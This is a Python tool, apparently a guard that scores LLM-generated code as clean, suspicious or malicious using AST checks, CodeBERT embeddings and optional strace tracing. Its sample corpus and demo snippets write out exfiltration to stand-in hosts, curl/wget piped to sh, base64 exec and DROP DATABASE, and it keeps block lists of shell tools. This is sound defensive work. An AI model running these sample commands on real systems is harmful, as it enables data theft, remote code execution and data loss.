#!/usr/bin/env python3
"""
holistic_guard.py

Usage:
  # dry-run on bundled examples (no runtime trace):
  python backdoor_guard.py

  # run on a JSONL of LLM outputs (each line is {"id": "...", "code": "...", "meta": {...}})
  python holistic_guard.py --input samples.jsonl --output results.jsonl

  # enable runtime syscall tracing (DANGEROUS — run only in isolated Linux runner)
  python holistic_guard.py --input samples.jsonl --output results.jsonl --enable-runtime

What it does:
  - AST-based SQL detection
  - Static subprocess/binary heuristic detection
  - Embedding similarity detection using CodeBERT + FAISS (builds a small local index)
  - Optional runtime syscalls via strace and destructive-syscall scoring
  - Fusion of signals into final label and detailed diagnostics
"""

import argparse
import os
import json
import tempfile
import shlex
import subprocess
import re
import sys
from typing import List, Dict, Tuple, Any
import numpy as np


# ML deps
try:
    import torch
    from transformers import AutoTokenizer, AutoModel, AutoModelForSequenceClassification
    import faiss
    import numpy as np
except Exception as e:
    # We'll print instructions later if imports fail
    pass

# ---------------------------
# Configurable thresholds
# ---------------------------
EMBEDDING_SIM_THRESHOLD = 0.72   # cosine similarity threshold for embedding detector
EMBEDDING_TOPK = 3
ML_SCORE_THRESHOLD = 0.75       # placeholder if you add an ML classifier
SYS_ANOMALY_THRESHOLD = 1.5     # anomaly score threshold (tunable)
DESTRUCTIVE_SCORE_CUTOFF = 0.7  # final destructive score considered malicious

# ---------------------------
# Simple malicious corpus (starter). Expand in production.
# ---------------------------
MALICIOUS_CORPUS = [
    # socket exfiltration
    "import socket\ns=socket.socket();s.connect(('attacker.com',80));s.send(b'secret')",
    # shell download & execute
    "import os\nos.system('curl http://evil.tld/p | sh')",
    # base64 exec
    "import base64\nexec(base64.b64decode('...'))",
    # subprocess remote code
    "from subprocess import Popen\nPopen(['bash','-c','wget http://evil/p; sh p'])",
    # delete db via psql
    "import subprocess\nsubprocess.Popen(['psql','-c','DROP DATABASE dbname'])",
    # unlink / rm
    "import os\nos.unlink('/var/lib/data/db.sqlite')"
]

# ---------------------------
# Embedding detector (CodeBERT) + FAISS index
# ---------------------------
class CodeEmbedder:
    def __init__(self, model_name="microsoft/codebert-base"):
        self.model_name = model_name
        self._init_model()

    def _init_model(self):
        self.tokenizer = AutoTokenizer.from_pretrained(self.model_name)
        self.model = AutoModel.from_pretrained(self.model_name)
        self.model.eval()
        if torch.cuda.is_available():
            self.model.to("cuda")

    def embed(self, texts: List[str]) -> np.ndarray:
        toks = self.tokenizer(texts, padding=True, truncation=True, max_length=512, return_tensors="pt")
        if torch.cuda.is_available():
            toks = {k: v.cuda() for k, v in toks.items()}
        with torch.no_grad():
            out = self.model(**toks, return_dict=True)
            last = out.last_hidden_state  # (B, L, D)
            mask = toks["attention_mask"].unsqueeze(-1)  # (B, L, 1)
            summed = (last * mask).sum(1)
            counts = mask.sum(1).clamp(min=1)
            pooled = (summed / counts).cpu().numpy()
            # L2 normalize
            pooled = pooled / np.linalg.norm(pooled, axis=1, keepdims=True)
            return pooled.astype("float32")

class EmbeddingDetector:
    def __init__(self, embedder: CodeEmbedder, index_path="malicious_index.faiss", meta_path="malicious_meta.json"):
        self.embedder = embedder
        self.index_path = index_path
        self.meta_path = meta_path
        self.index = None
        self.meta = []
        if os.path.exists(index_path) and os.path.exists(meta_path):
            self._load_index()

    def build_index(self, malicious_snippets: List[str]):
        emb = self.embedder.embed(malicious_snippets)
        d = emb.shape[1]
        idx = faiss.IndexFlatIP(d)
        idx.add(emb)
        faiss.write_index(idx, self.index_path)
        with open(self.meta_path, "w") as f:
            json.dump(malicious_snippets, f)
        self.index = idx
        self.meta = malicious_snippets
        print(f"[embedding] Built index with {len(malicious_snippets)} examples.")

    def _load_index(self):
        self.index = faiss.read_index(self.index_path)
        with open(self.meta_path, "r") as f:
            self.meta = json.load(f)

    def query(self, snippet: str, topk=EMBEDDING_TOPK, threshold=EMBEDDING_SIM_THRESHOLD) -> Tuple[List[Tuple[str, float]], List[float]]:
        if self.index is None:
            raise RuntimeError("Embedding index not built or loaded.")
        q = self.embedder.embed([snippet])
        D, I = self.index.search(q, topk)
        sims = D[0].tolist()
        idxs = I[0].tolist()
        hits = []
        for j, i in enumerate(idxs):
            if i != -1 and sims[j] >= threshold:
                hits.append((self.meta[i], float(sims[j])))
        return hits, sims

# ---------------------------
# AST-based dangerous SQL detection
# ---------------------------
import ast

DANGEROUS_SQL_KEYWORDS = {"drop", "truncate", "delete", "alter", "create", "replace"}

class SQLCallVisitor(ast.NodeVisitor):
    def __init__(self):
        self.dangerous_calls = []  # list of (lineno, sql_snippet, reason)

    def _is_sql_string(self, node):
        if isinstance(node, ast.Constant) and isinstance(node.value, str):
            s = node.value.lower()
            for kw in DANGEROUS_SQL_KEYWORDS:
                if re.search(rf"\b{kw}\b", s):
                    return s
        return None

    def visit_Call(self, node):
        # .execute / .executemany / .executescript
        if isinstance(node.func, ast.Attribute):
            name = node.func.attr.lower()
            if name in {"execute", "executemany", "executescript"}:
                if node.args:
                    sql_literal = self._is_sql_string(node.args[0])
                    if sql_literal:
                        self.dangerous_calls.append((node.lineno, sql_literal.strip(), f"{name} with literal"))
                    else:
                        self.dangerous_calls.append((node.lineno, ast.unparse(node.args[0]) if hasattr(ast, "unparse") else "<expr>", "dynamic_sql"))
        # detect ORM-style .delete() invocations
        if isinstance(node.func, ast.Attribute):
            if node.func.attr.lower() == "delete":
                self.dangerous_calls.append((node.lineno, ast.unparse(node.func) if hasattr(ast, "unparse") else "delete_call", "orm_delete"))
        self.generic_visit(node)

def detect_dangerous_sql_in_python(code: str) -> Dict[str, Any]:
    try:
        tree = ast.parse(code)
    except Exception:
        return {"error": "parse_failure", "dangerous": True, "reason": "could not parse; escalate"}
    v = SQLCallVisitor()
    v.visit(tree)
    findings = v.dangerous_calls
    dynamic_present = any(r == "dynamic_sql" for (_, _, r) in findings)
    return {"dangerous": bool(findings), "findings": findings, "dynamic_sql_present": dynamic_present}

# ---------------------------
# Static subprocess/binary heuristic detection
# ---------------------------
# ---------------------------
# Static subprocess/binary detection (AST + “dynamic arg” check)
# ---------------------------
SENSITIVE_BINS = {"rm", "rmdir", "psql", "mysql", "mongo", "redis-cli", "pg_dump", "pg_restore", "dropdb", "sh", "bash", "curl", "wget", "nc", "python", "pip"}
SENSITIVE_FLAGS = {"-rf", "--recursive", "--force", "--execute", "-e", "-c"}  # common dangerous flags

class SubprocessVisitor(ast.NodeVisitor):
    """
    Finds calls to subprocess.* and os.system and extracts:
      - callee (e.g., subprocess.run, Popen, os.system)
      - argv expression (source form, best-effort)
      - whether any argument is non-literal (dynamic)
      - whether a sensitive binary or flag is present (in literals only)
    """
    def __init__(self):
        self.findings = []  # list of dicts

    # best-effort “is literal” checker for strings, lists/tuples of literals, and simple concatenations
    def _is_literalish(self, node: ast.AST) -> bool:
        if isinstance(node, ast.Constant):  # "str", 3
            return True
        if isinstance(node, (ast.List, ast.Tuple)):
            return all(self._is_literalish(elt) for elt in node.elts)
        # f-strings: dynamic if any formatted value is not constant
        if isinstance(node, ast.JoinedStr):
            return all(isinstance(v, ast.Constant) for v in node.values)
        # "a" + "b" or "a" * 2
        if isinstance(node, ast.BinOp) and isinstance(node.op, (ast.Add, ast.Mult)):
            return self._is_literalish(node.left) and self._is_literalish(node.right)
        # format call like "{} {}".format("a", "b") -> treat as dynamic (too many edge cases)
        return False

    def _text(self, node: ast.AST) -> str:
        try:
            return ast.unparse(node)  # py3.9+
        except Exception:
            return "<expr>"

    def _literal_tokens(self, node: ast.AST) -> str:
        """Return a best-effort literal string to scan for binaries/flags if it’s string-ish/list-ish."""
        if isinstance(node, ast.Constant) and isinstance(node.value, str):
            return node.value
        if isinstance(node, (ast.List, ast.Tuple)):
            parts = []
            for elt in node.elts:
                if isinstance(elt, ast.Constant) and isinstance(elt.value, str):
                    parts.append(elt.value)
            return " ".join(parts)
        if isinstance(node, ast.JoinedStr):
            # include only constant chunks of f-string
            parts = [v.value for v in node.values if isinstance(v, ast.Constant) and isinstance(v.value, str)]
            return "".join(parts)
        if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
            # join only constant string pieces
            left = self._literal_tokens(node.left)
            right = self._literal_tokens(node.right)
            return (left or "") + (right or "")
        return ""

    def _has_sensitive_bin_or_flag(self, argv_node: ast.AST) -> Tuple[bool, bool, str]:
        text = self._literal_tokens(argv_node)
        if not text:
            return False, False, ""
        # simple tokenization by whitespace and common separators
        tokens = re.split(r"[\s,;]+", text)
        lower = [t.strip().strip("'\"").lower() for t in tokens if t.strip()]
        bin_hit = any(t in SENSITIVE_BINS or t.endswith("/" + b) for t in lower for b in SENSITIVE_BINS)
        flag_hit = any(f in lower for f in SENSITIVE_FLAGS)
        # try to capture the first sensitive token for reporting
        hit = next((t for t in lower if t in SENSITIVE_BINS or any(t.endswith("/" + b) for b in SENSITIVE_BINS)), "")
        return bin_hit, flag_hit, hit

    def visit_Call(self, node: ast.Call):
        callee = None
        if isinstance(node.func, ast.Attribute) and isinstance(node.func.value, ast.Name):
            if node.func.value.id == "subprocess":
                callee = f"subprocess.{node.func.attr}"
            elif node.func.value.id == "os" and node.func.attr == "system":
                callee = "os.system"

        if callee is not None:
            argv_node = node.args[0] if node.args else None
            dynamic = any(not self._is_literalish(arg) for arg in node.args) if node.args else True
            bin_hit = False
            flag_hit = False
            sensitive_bin = ""
            if argv_node is not None:
                bin_hit, flag_hit, sensitive_bin = self._has_sensitive_bin_or_flag(argv_node)

            self.findings.append({
                "lineno": getattr(node, "lineno", -1),
                "callee": callee,
                "argv_repr": self._text(argv_node) if argv_node is not None else "",
                "dynamic_args": dynamic,
                "bin_hit": bin_hit,
                "flag_hit": flag_hit,
                "sensitive_bin": sensitive_bin,
            })

        self.generic_visit(node)


def detect_subprocess_binaries(code: str) -> List[Dict[str, Any]]:
    """
    Backwards-compatible name, richer return:
    returns a list of finding dicts (see SubprocessVisitor.findings).
    """
    try:
        tree = ast.parse(code)
    except Exception:
        # If we can’t parse, keep behavior conservative: no findings (AST already flags parse errors elsewhere)
        return []
    v = SubprocessVisitor()
    v.visit(tree)
    return v.findings


# ---------------------------
# Optional: runtime tracing via strace (Linux only)
# ---------------------------
DELETE_SYSCALLS = {
    "unlink", "unlinkat", "rmdir", "rename", "renameat", "truncate", "ftruncate", "open", "openat"
}
EXEC_SYSCALLS = {"execve"}

def run_under_strace(code: str, timeout=5) -> Tuple[List[str], int, str, str]:
    """
    Runs code under strace and returns syscall sequence, returncode, stdout, stderr
    Requires strace installed and Linux environment.
    """
    with tempfile.NamedTemporaryFile("w", delete=False, suffix=".py") as tmp:
        tmp.write(code)
        tmp_path = tmp.name
    logfile = tmp_path + ".strace"
    # trace network/process/file operations; -ff to follow forks
    cmd = f"strace -ff -e trace=network,process,file -o {shlex.quote(logfile)} python3 {shlex.quote(tmp_path)}"
    try:
        p = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=timeout)
        # collect trace files
        traces = []
        outdir = os.path.dirname(tmp_path)
        basename = os.path.basename(logfile)
        for fname in os.listdir(outdir):
            if fname.startswith(basename):
                try:
                    with open(os.path.join(outdir, fname), "r", errors="ignore") as f:
                        traces.append(f.read())
                except Exception:
                    pass
        seq = []
        for t in traces:
            for line in t.splitlines():
                m = re.match(r"\s*([a-zA-Z0-9_]+)\(", line)
                if m:
                    seq.append(m.group(1))
        stdout = p.stdout.decode(errors="ignore")
        stderr = p.stderr.decode(errors="ignore")
        return seq, p.returncode, stdout, stderr
    except subprocess.TimeoutExpired:
        return ["TIMEOUT"], -1, "", "Timeout"
    finally:
        try:
            os.remove(tmp_path)
            for fname in os.listdir(os.path.dirname(tmp_path)):
                if fname.startswith(os.path.basename(logfile)):
                    os.remove(os.path.join(os.path.dirname(tmp_path), fname))
        except Exception:
            pass

def detect_destructive_syscalls(seq: List[str], strace_text: str = "") -> Dict[str, Any]:
    findings = []
    score = 0.0
    for s in seq:
        if s in DELETE_SYSCALLS:
            findings.append(("syscall", s))
            score += 0.35
        if s in EXEC_SYSCALLS:
            findings.append(("exec", s))
            score += 0.2
    # bonus: detect execve of known binaries in raw text
    if strace_text:
        if re.search(r"execve\(.+?/rm\b", strace_text):
            findings.append(("exec_binary", "rm"))
            score += 0.6
        if re.search(r"execve\(.+?/psql\b", strace_text):
            findings.append(("exec_binary", "psql"))
            score += 0.6
        if re.search(r"execve\(.+?/mysql\b", strace_text):
            findings.append(("exec_binary", "mysql"))
            score += 0.6
    score = min(score, 1.0)
    return {"findings": findings, "score": score, "is_destructive": score >= DESTRUCTIVE_SCORE_CUTOFF}

# ---------------------------
# Fusion & orchestration
# ---------------------------
class HolisticGuard:
    def __init__(self, enable_runtime=False, rebuild_embedding_index=False, ml_model_path=None):
        self.enable_runtime = enable_runtime
        self.embedder = None
        self.embedding_detector = None

        # ML classifier (optional)
        self.ml_tokenizer = None
        self.ml_model = None

        try:
            self.embedder = CodeEmbedder()
            self.embedding_detector = EmbeddingDetector(self.embedder)
        except Exception as e:
            print("[warn] Embedding components not available. Install transformers/faiss/torch if you want embedding detection.")
            self.embedder = None
            self.embedding_detector = None

        if self.embedding_detector is not None and (rebuild_embedding_index or not os.path.exists(self.embedding_detector.index_path)):
            try:
                self.embedding_detector.build_index(MALICIOUS_CORPUS)
            except Exception as e:
                print("[warn] Failed to build embedding index:", e)

        # Try to load optional BERT classifier
        if ml_model_path:
            try:
                from transformers import AutoTokenizer, AutoModelForSequenceClassification
                import torch  # noqa: F401
                self.ml_tokenizer = AutoTokenizer.from_pretrained(ml_model_path, use_fast=True)
                self.ml_model = AutoModelForSequenceClassification.from_pretrained(ml_model_path)
                self.ml_model.eval()
                if torch.cuda.is_available():
                    self.ml_model.to("cuda")
                print(f"[ml] Loaded classifier from {ml_model_path}")
            except Exception as e:
                print(f"[warn] Failed to load ML classifier from {ml_model_path}: {e}")
                self.ml_tokenizer = None
                self.ml_model = None


    def score_snippet(self, snippet: str) -> Dict[str, Any]:
        result = {
            "snippet_preview": snippet[:300],
            "ast_sql": None,
            "subproc_hits": None,
            "embedding_hits": None,
            "runtime": None,
            "scores": {"ast": 0.0, "subproc": 0.0, "embed": 0.0, "runtime_destruct": 0.0, "ml": 0.0},
            "final_label": "CLEAN",
        }

        # AST SQL detection
        try:
            ast_res = detect_dangerous_sql_in_python(snippet)
            result["ast_sql"] = ast_res
            if ast_res.get("dangerous"):
                # if literal dangerous SQL -> high signal
                result["scores"]["ast"] = 0.8
                if ast_res.get("dynamic_sql_present"):
                    result["scores"]["ast"] = 0.6
        except Exception as e:
            result["ast_sql"] = {"error": str(e)}
            result["scores"]["ast"] = 0.2

        # subprocess / binary detection
                # subprocess / binary detection (AST + argument analysis)
        try:
            subs = detect_subprocess_binaries(snippet)  # now returns list of dicts
            result["subproc_hits"] = subs

            # Scoring: additive weights per finding; capped
            sub_score = 0.0
            for f in subs:
                # base weight if we even call a subprocess sink
                sub_score += 0.15
                if f.get("bin_hit"):
                    sub_score += 0.25
                if f.get("flag_hit"):
                    sub_score += 0.20
                if f.get("dynamic_args"):
                    sub_score += 0.20
                callee = f.get("callee", "")
                if callee in {"os.system", "subprocess.Popen"}:
                    sub_score += 0.10
                # bash/sh with -c is especially risky even if argv literal
                if f.get("sensitive_bin") in {"sh", "bash"} and f.get("flag_hit"):
                    sub_score += 0.15

            # cap and nudge if multiple risky calls
            if len(subs) >= 2:
                sub_score += 0.10
            result["scores"]["subproc"] = min(sub_score, 0.9)
        except Exception as e:
            result["subproc_hits"] = {"error": str(e)}

        # embedding similarity (if available)
        if self.embedding_detector is not None:
            try:
                hits, sims = self.embedding_detector.query(snippet)
                result["embedding_hits"] = [{"example": h[0], "sim": h[1]} for h in hits]
                if hits:
                    # strongest hit determines score proportionally
                    best_sim = max(h[1] for h in hits)
                    # map sim [threshold..1] to 0.4..0.9
                    mapped = 0.4 + 0.5 * (best_sim - EMBEDDING_SIM_THRESHOLD) / (1.0 - EMBEDDING_SIM_THRESHOLD)
                    result["scores"]["embed"] = min(max(mapped, 0.0), 0.9)
            except Exception as e:
                result["embedding_hits"] = {"error": str(e)}

                # optional ML classifier score (BERT fine-tuned on malicious vs clean)
        if self.ml_model is not None and self.ml_tokenizer is not None:
            try:
                toks = self.ml_tokenizer(
                    snippet,
                    truncation=True,
                    max_length=512,
                    return_tensors="pt",
                    padding=False
                )
                import torch
                if torch.cuda.is_available():
                    toks = {k: v.cuda() for k, v in toks.items()}
                with torch.no_grad():
                    out = self.ml_model(**toks)
                    probs = out.logits.softmax(-1).detach().cpu().numpy()[0]
                    p_mal = float(probs[1])  # class1 = MALICIOUS
                # map probability to a conservative 0..0.9 contribution
                result["scores"]["ml"] = min(max(p_mal, 0.0), 0.9)
                result["ml_prob"] = p_mal
            except Exception as e:
                result["ml_error"] = str(e)

        # runtime (optional)
        if self.enable_runtime:
            try:
                seq, rc, out, err = run_under_strace(snippet)
                # reconstruct strace raw text for execve detection
                raw_text = err + out
                runtime_res = {"seq_len": len(seq), "exit_code": rc, "stdout": out, "stderr": err}
                destr = detect_destructive_syscalls(seq, raw_text)
                runtime_res["destructive"] = destr
                result["runtime"] = runtime_res
                result["scores"]["runtime_destruct"] = destr.get("score", 0.0)
            except Exception as e:
                result["runtime"] = {"error": str(e)}
                result["scores"]["runtime_destruct"] = 0.0

        # fuse scores (simple weighted sum)
        weights = {"ast": 1.0, "subproc": 0.9, "embed": 0.8, "runtime_destruct": 1.2, "ml": 0.8}
        total = 0.0
        wsum = 0.0
        for k, w in weights.items():
            s = result["scores"].get(k, 0.0)
            total += w * s
            wsum += w
        fused = total / (wsum + 1e-9)
        result["fused_score"] = round(float(fused), 4)

        # final label rules
        if result["scores"]["runtime_destruct"] >= DESTRUCTIVE_SCORE_CUTOFF or result["scores"]["ast"] >= 0.8:
            label = "MALICIOUS"
        elif result["fused_score"] >= 0.45 or result["scores"]["subproc"] >= 0.8:
            label = "SUSPICIOUS"
        else:
            label = "CLEAN"
        result["final_label"] = label
        return result

# ---------------------------
# CLI: process JSONL or run examples
# ---------------------------
EXAMPLE_SNIPPETS = {
    "benign": "def add(a,b):\n    return a+b\nprint(add(2,3))",
    "eval": "user_input='print(1)'\neval(user_input)",
    "curl_shell": "import os\nos.system('curl http://evil.com/p | sh')",
    "b64_exec": "import base64\nexec(base64.b64decode('cHJpbnQoJ0hlbGxvJyk='))",
    "socket_frag": "import socket as s\nh='ev'+'il.com'\np=80\nc=s.socket();\ntry:\n  c.connect((h,p)); c.send(b'tk')\nexcept: pass",
    "conditional_exfil": "import os,requests\nif os.getenv('RUN_PAYLOAD')=='1':\n  requests.post('http://example.com/collect', json={'secret':'s'})",
    "db_drop_literal": "import psycopg2\nc=psycopg2.connect(...)\nc.cursor().execute('DROP DATABASE mydb')",
    "orm_delete": "User.objects.filter(active=False).delete()",
}

def process_batch(hg, input_path: str, output_path: str, enable_runtime: bool):
    with open(input_path, "r") as fin, open(output_path, "w") as fout:
        for line in fin:
            try:
                item = json.loads(line)
                code = item.get("code", "")
                sid = item.get("id", None)
                res = hg.score_snippet(code)
                out = {"id": sid, "result": res}
                fout.write(json.dumps(out) + "\n")
            except Exception as e:
                fout.write(json.dumps({"error": str(e), "line": line}) + "\n")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--ml-model-path", type=str, default=None,
                    help="Path to a fine-tuned HF sequence classifier dir (e.g., ./malicious-bert-base)")
    parser.add_argument("--input", help="JSONL input file (each line: {id, code, meta})", default=None)
    parser.add_argument("--output", help="JSONL output path", default="results.jsonl")
    parser.add_argument("--enable-runtime", action="store_true", help="Enable runtime strace tracing (DANGEROUS)")
    parser.add_argument("--rebuild-embedding-index", action="store_true", help="Rebuild embedding index from built-in malicious corpus")
    args = parser.parse_args()

    # confirm dependencies
    try:
        import torch, transformers, faiss, numpy  # noqa
    except Exception:
        print("ERROR: missing python libraries. Install with:")
        print("  pip install torch transformers faiss-cpu numpy")
        sys.exit(1)

    if args.input:
        hg = HolisticGuard(enable_runtime=args.enable_runtime,
                       rebuild_embedding_index=args.rebuild_embedding_index,
                       ml_model_path=args.ml_model_path)
        process_batch(hg, args.input, args.output, args.enable_runtime)
        print(f"Done. Results written to {args.output}")
        return

    # no input: demo run on examples
    hg = HolisticGuard(enable_runtime=args.enable_runtime,
                   rebuild_embedding_index=args.rebuild_embedding_index,
                   ml_model_path=args.ml_model_path)
    print("Running demo on example snippets (runtime tracing enabled? ->", args.enable_runtime, ")")
    for name, code in EXAMPLE_SNIPPETS.items():
        print("----")
        print("Sample:", name)
        res = hg.score_snippet(code)
        print("Label:", res["final_label"], "FusedScore:", res["fused_score"])
        print("Signals:", {k: v for k, v in res["scores"].items() if v})
        if res.get("embedding_hits"):
            print("Embedding hits:", res["embedding_hits"])
        if res.get("ast_sql") and res["ast_sql"].get("findings"):
            print("AST SQL findings:", res["ast_sql"]["findings"])
        if res.get("subproc_hits"):
            print("Subprocess hits:", res["subproc_hits"])
        print()

# ---------------------------
# Simple API for external callers
# ---------------------------
_global_guard = None
DEFAULT_ML_MODEL_PATH = os.getenv("BACKDOOR_GUARD_ML_MODEL")
if DEFAULT_ML_MODEL_PATH is None and os.path.isdir("./malicious-bert-base"):
    DEFAULT_ML_MODEL_PATH = "./malicious-bert-base"

def set_default_ml_model_path(path: str):
    """
    Optional: call this once (e.g., from shield.py) to force a default model path.
    Next check will lazy-reinit the guard with this path.
    """
    global DEFAULT_ML_MODEL_PATH, _global_guard
    DEFAULT_ML_MODEL_PATH = path
    _global_guard = None  # force re-init on next call


def _get_guard(enable_runtime: bool = False, ml_model_path: str | None = None):
    global _global_guard
    if _global_guard is None:
        try:
            _global_guard = HolisticGuard(
                enable_runtime=enable_runtime,
                ml_model_path=ml_model_path or DEFAULT_ML_MODEL_PATH
            )
        except Exception as e:
            return None, {"error": f"Failed to initialize guard: {e}"}
    return _global_guard, None


def check_code_safety(code: str, enable_runtime: bool = False, ml_model_path: str | None = None) -> Dict[str, Any]:
    """
    Simple one-line API to check if code is suspicious.

    Args:
        code: code to analyze
        enable_runtime: enable strace (dangerous)
        ml_model_path: optional override to load a specific fine-tuned classifier

    Behavior:
        - If ml_model_path is None, will use DEFAULT_ML_MODEL_PATH (env BACKDOOR_GUARD_ML_MODEL or ./malicious-bert-base if present)
        - Lazy-initializes and caches the guard instance
    """
    guard, err = _get_guard(enable_runtime=enable_runtime, ml_model_path=ml_model_path)
    if guard is None:
        return {"label": "ERROR", "score": 0.0, "details": err}

    try:
        result = guard.score_snippet(code)
        return {
            "label": result["final_label"],
            "score": result["fused_score"],
            "details": result
        }
    except Exception as e:
        return {"label": "ERROR", "score": 0.0, "details": {"error": str(e)}}


if __name__ == "__main__":
    main()